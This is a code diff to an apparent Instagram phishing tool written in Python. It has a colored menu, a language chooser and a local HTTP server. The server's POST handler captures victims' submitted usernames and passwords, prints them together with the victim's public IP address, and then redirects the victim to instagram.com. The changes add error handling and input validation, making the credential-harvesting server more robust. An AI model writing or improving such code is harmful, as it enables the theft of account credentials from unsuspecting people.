@@ -34,12 +34,16 @@ for part in parts:
     elif part.startswith('5] Get'):
         print(f'    \n{red_color}[{white_color}5{red_color}] {yellow_color} Get-Followers ', end='')
     elif part.startswith('6] CLD'):
-        print(f'   {red_color}[{white_color}6{red_color}] {yellow_color} CLD Tools', end='')
+        print(f'   {red_color}[{white_color}6{red_color}] {yellow_color} CLD Tools', end='\n',)
     else:
         print(part, end='')
 
 print(Fore.BLUE)
-chosen = int(input("\nChoice: "))
+try:
+    chosen = int(input("Choice: "))
+except ValueError:
+    print(Fore.RED + "Invalid input. Please enter a number.")
+    exit()
 print(Fore.GREEN)
 
 class MyHTTPRequestHandler(BaseHTTPRequestHandler):
@@ -65,27 +69,30 @@ class MyHTTPRequestHandler(BaseHTTPRequestHandler):
                     self.wfile.write(content)
         except FileNotFoundError:
             self.send_error(404, f'File Not Found: {self.path}')
+        except Exception as e:
+            self.send_error(500, f'Server Error: {e}')
 
     def do_POST(self):
-        content_length = int(self.headers['Content-Length'])
-        post_data = self.rfile.read(content_length).decode('utf-8')
-        post_data = post_data.split('&')
-        data_dict = {}
-        for item in post_data:
-            key, value = item.split('=')
-            data_dict[key] = value
+        try:
+            content_length = int(self.headers['Content-Length'])
+            post_data = self.rfile.read(content_length).decode('utf-8')
+            post_data = post_data.split('&')
+            data_dict = {}
+            for item in post_data:
+                key, value = item.split('=')
+                data_dict[key] = value
 
-        # Kullanıcının public IP adresini al
-        public_ip = self.get_public_ip()
-        
-        # Konsola yazdır
-        print(Fore.RED, "Username:", data_dict['username'])
-        print(Fore.RED, "Password:", data_dict['password'])
-        print(Fore.RED, "Address:", public_ip,Fore.RESET)
+            public_ip = self.get_public_ip()
+            
+            print(Fore.RED, "Username:", data_dict['username'])
+            print(Fore.RED, "Password:", data_dict['password'])
+            print(Fore.RED, "Address:", public_ip, Fore.RESET)
 
-        self.send_response(302)  # 302 Found: Yönlendirme
-        self.send_header('Location', 'http://www.instagram.com')  # Test için test.com kullanıldı, gerçek URL'yi belirtin
-        self.end_headers()
+            self.send_response(302)
+            self.send_header('Location', 'http://www.instagram.com')
+            self.end_headers()
+        except Exception as e:
+            self.send_error(500, f'Failed to process POST request: {e}')
 
     def get_public_ip(self):
         try:
@@ -135,7 +142,11 @@ if chosen == 1:
 3. Chinese      6. German     9. Russian""")
 
 print(Fore.BLUE)
-lang = int(input("Choice: "))
+try:
+    lang = int(input("Choice: "))
+except ValueError:
+    print(Fore.RED + "Invalid input. Please enter a number.")
+    exit()
 print(Fore.GREEN)
 
 if lang ==  1:
@@ -165,8 +176,11 @@ if c_port:
     print(f"Server IP Address: {host}")
     print(f"Selected port: {c_port}\n")
 
-    server = HTTPServer((host, c_port), MyHTTPRequestHandler)
-    print(f"Server is started on: http://{host}:{c_port}/\n",Fore.RESET)
-    server.serve_forever()
+    try:
+        server = HTTPServer((host, c_port), MyHTTPRequestHandler)
+        print(f"Server is started on: http://{host}:{c_port}/\n", Fore.RESET)
+        server.serve_forever()
+    except Exception as e:
+        print(Fore.RED, f"Failed to start server: {e}")
 else:
     print(Fore.RED,"No free port found.")
